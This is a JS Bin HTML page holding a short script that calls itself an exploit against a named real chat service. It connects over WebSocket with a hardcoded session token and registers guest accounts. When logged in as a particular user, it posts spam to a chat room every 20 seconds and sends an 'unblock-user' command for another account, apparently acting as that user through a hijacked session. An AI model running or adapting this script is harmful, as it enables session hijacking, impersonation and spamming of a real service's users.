
<!DOCTYPE html>
<!--
Created using JS Bin
http://jsbin.com
Copyright (c) 2019 by thegirlwiththedragontatoo (http://jsbin.com/zumijez/1/edit)
Released under the MIT license: http://jsbin.mit-license.org
-->
<meta name="robots" content="noindex">
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>JS Bin</title>
</head>
<body>
  <script>

    console.log("start exploit...");
    const MSG = "Mazhai :P";
    const ROOM = "kudumi";
    var guest = false;
    var allok = false;
    var guestname = "Dragon";
    var user = '';
    var role = '';
    ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
    ws.onmessage = function(m) {
      var jsonData = JSON.parse(m.data);
      var dataType = jsonData.type;
      console.log("message----",jsonData.data);
      if(dataType=="register"){
        	user = jsonData.data.username;
          role = jsonData.data.role
           if(jsonData.data.status=="success"){
           	if((user != 'mazhai')&&(user == 'suri25')){
               window.setInterval(function() {
                  if(ws.OPEN){send(ROOM, MSG);}
               }, 20000);
            	/* send() */;
            }
           }
          if(jsonData.data.status=="guest"){
          	guest = true;
            register(guestname);
          }
           if(jsonData.data.type=="error"){
          	guestname = guestname + Math.floor((Math.random() * 10) + 1);
            register(guestname);
          }
          
        }
  
    }
    console.log("ws--",ws);
    initsession = () => {
    	ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2rkbi"}}));
    }
    register = (guestname) => {
    	 if(guest) {ws.send(JSON.stringify({"type":"register","data":{"username":guestname,"gender":"male"}}));}
    }
    send = (room,msg) => {
    	console.log("state:", guest, user, role);
      ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
      ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
    }
    
    ws.onopen = () => {
      initsession();
			register(guestname);
      /* window.setTimeout(function() {
        connect(guestname);
      }, 6000); */

      window.setTimeout(function() {
        ws.close();
      }, 180000);
    }
    
    
  </script>
</body>
</html>
